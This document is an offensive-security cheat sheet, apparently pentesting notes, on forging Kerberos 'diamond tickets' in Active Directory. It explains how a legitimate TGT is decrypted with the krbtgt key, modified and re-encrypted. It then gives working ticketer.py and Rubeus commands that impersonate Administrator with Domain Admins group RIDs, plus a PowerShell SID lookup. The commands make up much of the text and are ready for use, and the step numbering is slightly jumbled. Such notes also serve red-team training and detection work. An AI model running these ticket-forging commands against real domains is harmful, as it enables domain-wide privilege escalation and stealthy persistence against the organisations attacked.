# Diamond Ticket

### Like a golden ticket, a diamond ticket is a TGT which can be used to access any service as any user. A golden ticket is forged completely offline, encrypted with the krbtgt hash of that domain, and then passed into a logon session for use. Because domain controllers don't track TGTs it (or they) have legitimately issued, they will happily accept TGTs that are encrypted with its own krbtgt hash.

### A diamond ticket is made by modifying the fields of a legitimate TGT that was issued by a DC. This is achieved by requesting a TGT, decrypting it with the domain's krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it. This overcomes the two aforementioned shortcomings of a golden ticket because:

#### 1) TGS-REQs will have a preceding AS-REQ.

#### 2) The TGT was issued by a DC which means it will have all the correct details from the domain's Kerberos policy. Even though these can be accurately forged in a golden ticket, it's more complex and open to mistakes.

### Request a legit low-priv TGT and recalculate only the PAC field providing the krbtgt encryption key

## Requirements:

#### 1) krbtgt NT hash

#### 2) krbtgt AES key

## Steps:

### 1) Get user SID

    powershell Get-DomainUser -Identity USERNAME -Properties objectsid

1)

      ticketer.py -request -domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'
  
4)

      .\Rubeus.exe diamond /tgtdeleg /ticketuser:USERNAME /ticketuserid:RID_OF_USERNAME /groups:512

OR 

    .\Rubeus.exe diamond /krbkey:<aes_krbtgt_key> /user:user1 /password:password /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:Administrator /ticketuserid:<target_RID> /groups:512 /nowrap

### /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.

### /ticketuser is the username of the principal to impersonate.

### /ticketuserid is the domain RID of that principal.

### /groups are the desired group RIDs (512 being Domain Admins).

### /krbkey is the krbtgt AES256 hash. 

